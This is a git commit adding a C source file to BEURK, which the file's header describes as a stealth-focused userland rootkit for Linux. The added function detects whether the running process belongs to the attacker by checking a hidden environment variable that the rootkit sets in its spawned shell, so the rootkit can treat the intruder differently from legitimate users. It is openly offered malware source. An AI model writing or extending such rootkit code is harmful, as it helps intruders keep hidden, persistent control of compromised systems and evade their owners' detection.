b070a11318af32dc05fc1b5f3f8a944d0c047c74
mzap <mzapata@student.42.fr>
2015-05-13 16:39:41 +0200

    feat(core): add attacker detection
    with an env var created by the shell we spawn

---
+++ src/attacker.c
@@ -0,0 +1,46 @@
+/*
+ * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
+ * Copyright (C) 2015  unix-thrust
+ *
+ * This file is part of BEURK.
+ *
+ * BEURK is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * BEURK is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <stdbool.h>
+#include "beurk.h"
+
+/** is_attacker() checks if the process is called by the attacker,
+ * using a special environment variable that is defined in our
+ * spawned shell.
+ */
+
+int is_attacker(void) {
+    static int attacker = -1;
+
+    if (attacker != -1)
+        return (attacker);
+
+    DEBUG(D_INFO, "Checking if this is the attacker...");
+
+    if (getenv(HIDDEN_ENV_VAR)) {
+        DEBUG(D_INFO, "This is the attacker.");
+        attacker = 1;
+    }
+    else {
+        DEBUG(D_INFO, "This isn't the attacker.");
+        attacker = 0;
+    }
+    return (attacker);
+}
